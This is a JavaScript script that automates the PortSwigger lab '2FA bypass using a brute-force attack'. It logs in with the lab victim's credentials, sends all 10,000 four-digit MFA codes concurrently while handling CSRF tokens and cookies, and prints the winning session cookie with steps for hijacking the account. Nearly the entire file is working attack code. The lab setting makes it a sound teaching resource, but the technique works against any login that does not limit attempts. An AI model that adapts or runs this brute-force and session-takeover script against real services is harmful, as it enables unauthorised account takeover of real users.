import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { pressEnterToContinue } from "../../../utils/pressEnterToContinue.js";
import { runTasks } from "../../../utils/runTasks.js";
import { sleep } from "../../../utils/sleep.js";
import { extractCsrfToken } from "../../../utils/extractCsrfToken.js";
import { extractCookie } from "../../../utils/extractCookie.js";

const { labUrl, concurrencyLimit, httpClient } = getParsedInputFromUser({
  description: "Lab: 2FA bypass using a brute-force attack",
  concurrency: true,
  proxy: true,
});

await pressEnterToContinue(`
As the verification code will reset while you're running your attack, you may
need to repeat this attack several times before you succeed. This is because
the new code may be a number that your current attack has already attempted.

Technically, since the MFA code is four digits, there are a total of 10,000
possible combinations for this code. However, in practice, this PortSwigger lab
generates codes within the range of up to 2000. So, if you notice that the
attack exceeds the 2000 mark, you can press Ctrl + C and restart the lab.`);

await initializeMfaCode();
runTasks(getTasks(), concurrencyLimit);

async function initializeMfaCode() {
  // Initialize the mfa code on the server side.
  // This increases the chances to brute force MFA-code on the first pass
  console.log("Initializing the mfa code on the server side...");
  await task(0);
  await sleep(1_000);
  console.log("Done!\n");
}

function getTasks() {
  const tasks = [];
  const minMfaCode = 0;
  const maxMfaCode = 10_000 - 1;
  for (let i = minMfaCode; i <= maxMfaCode; i++) {
    tasks.push(() => task(i));
  }
  return tasks;
}

async function task(index) {
  let [sessionCookie, csrfToken] = await getFromLogin();
  sessionCookie = await postToLogin(sessionCookie, csrfToken);
  csrfToken = await getFromLogin2(sessionCookie);

  const mfaCode = getMfaCode(index);
  //Only one post to /login2, so that we can do concurrent requests
  const response = await postToLogin2({
    sessionCookie,
    csrfToken,
    mfaCode,
  });
  if (isResponseSuccess(response)) {
    console.log(`${mfaCode}: success`);
    console.log(
      `To solve the lab:
        1. Go to lab home page.
        2. Edit your browser cookie for the lab site with key "session" and value "${extractCookie(response, "session").value}",
        refresh the page.
        3. Go to "My account" page.`,
    );
    process.exit(0);
  }
  console.log(`${mfaCode}: fail`);
}

async function getFromLogin() {
  let response = await httpClient.get(labUrl + "login");
  return [extractCookie(response, "session"), extractCsrfToken(response.data)];
}

async function postToLogin(sessionCookie, csrfToken) {
  const victimsCredentials = { username: "carlos", password: "montoya" };
  const data = new URLSearchParams({ csrf: csrfToken, ...victimsCredentials });
  const response = await httpClient.post(labUrl + "login", data, {
    headers: {
      cookie: sessionCookie,
    },
  });
  return extractCookie(response, "session");
}

async function getFromLogin2(sessionCookie) {
  const response = await httpClient.get(labUrl + "login2", {
    headers: {
      cookie: sessionCookie,
    },
  });
  return extractCsrfToken(response.data);
}

async function postToLogin2({ sessionCookie, csrfToken, mfaCode }) {
  const data = new URLSearchParams({ csrf: csrfToken, "mfa-code": mfaCode });
  return await httpClient.post(labUrl + "login2", data, {
    headers: {
      cookie: sessionCookie,
    },
  });
}

function getMfaCode(index) {
  return index.toString().padStart(4, "0");
}

function isResponseSuccess(response) {
  return response.status === 302;
}
